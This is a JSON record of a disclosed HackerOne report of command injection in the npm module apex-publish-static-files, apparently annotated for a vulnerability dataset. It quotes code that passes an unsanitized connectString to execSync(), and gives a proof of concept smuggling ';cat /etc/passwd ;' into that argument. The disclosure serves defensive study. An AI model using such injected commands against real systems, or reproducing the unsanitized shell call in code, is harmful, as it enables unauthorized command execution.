{
  "reported_to": "Node.js third-party modules",
  "reported_by": "abdilahrf_ ",
  "title": "[apex-publish-static-files] Command Injection on connectString",
  "content": "\nI would like to report a command injection vulnerability in the apex-publish-static-files npm module.\nIt allows arbitrary shell command execution through a maliciously crafted argument.\nModule\nmodule name: apex-publish-static-files\nversion: 2.0.0\nnpm page: https://www.npmjs.com/package/apex-publish-static-files\nModule Description\nUploads all files from a local directory to Oracle APEX\nModule Stats\n15 downloads in the last day\n~170 downloads in the last month\nVulnerability\nVulnerability Description\napex-publish-static-files does not sanitize the connectionString argument, and subsequently passes it to execSync(), thus allowing arbitrary shell command injection.\nVulnerability Code : https://github.com/vincentmorneau/apex-publish-static-files/blob/master/index.js#54-66\nCode 555 Bytes\n1\t\t\tconst childProcess = execSync(\n2\t\t\t\t'\"' + opts.sqlclPath + '\"' + // Sqlcl path\n3\t\t\t\t' ' + opts.connectString + // Connect string (user/pass@server:port/sid)\n4\t\t\t\t' @\"' + path.resolve(__dirname, 'lib/script') + '\"' + // Sql to execute\n5\t\t\t\t' \"' + path.resolve(__dirname, 'lib/distUpload.js') + '\"' + // Param &1 (js to execute)\n6\t\t\t\t' \"' + path.resolve(opts.directory) + '\"' + // Param &2\n7\t\t\t\t' ' + opts.appID + // Param &3\n8\t\t\t\t' \"' + opts.destination + '\"' + // Param &4\n9\t\t\t\t' \"' + opts.pluginName + '\"' // Param &5\n10\t\t\t\t, {\n11\t\t\t\t\tencoding: 'utf8'\n12\t\t\t\t}\n13\t\t\t);\nSteps To Reproduce:\nnpm i apex-publish-static-files\ncreate index.js file like this :\nCode 156 Bytes\n1var publisher = require('apex-publish-static-files');\n2 \n3publisher.publish({\n4connectString: \";cat /etc/passwd ;\",\n5    directory: \"public\",\n6    appID: 111\n7});\nexecute node index.js\napex_rce.png (F342500)\nSupporting Material/References:\nOS: WSL Ubuntu 16.04\nNODE: v10.8.0\nNPM : 6.2.0\nWrap up\nI contacted the maintainer to let them know: N\nI opened an issue in the related repository: N\nImpact\nIt allows arbitrary shell command execution through a maliciously crafted argument.\n\n",
  "severity": [
    10.0,
    null
  ],
  "bounty": null,
  "weaknesses": [
    "Command Injection - Generic"
  ],
  "screenshots": {},
  "disclosed_date": 1539901920,
  "report_url": "https://hackerone.com/reports/405694",
  "is_multi_component": false,
  "complexity": "MEDIUM",
  "novelty": "MEDIUM",
  "vuln_category": "CODE",
  "steps": [
    [
      1,
      "Install the vulnerable module: npm i apex-publish-static-files"
    ],
    [
      2,
      "Create an index.js file with malicious connectString payload and execute it: node index.js"
    ]
  ],
  "vuln_description": "The apex-publish-static-files npm module is vulnerable to command injection via the connectString parameter, which is passed unsanitized to execSync(), allowing arbitrary command execution.",
  "reason": "The vulnerability is straightforward to discover as it involves a direct command injection through a single unsanitized parameter in a simple code path. No complex interactions or state manipulations are required.",
  "new_complexity": "LOW",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "injection_metadata": {
    "is_simple_payload": true
  },
  "authnz_metadata": {
    "reason": "The vulnerability involves command injection through unsanitized input passed to execSync(), which is not related to authentication or authorization (AuthN/AuthZ) issues. The proposed methodologies focus on testing authorization boundaries between users and resources within the same application, not on input sanitization or command injection vulnerabilities.",
    "is_detectable": false
  }
}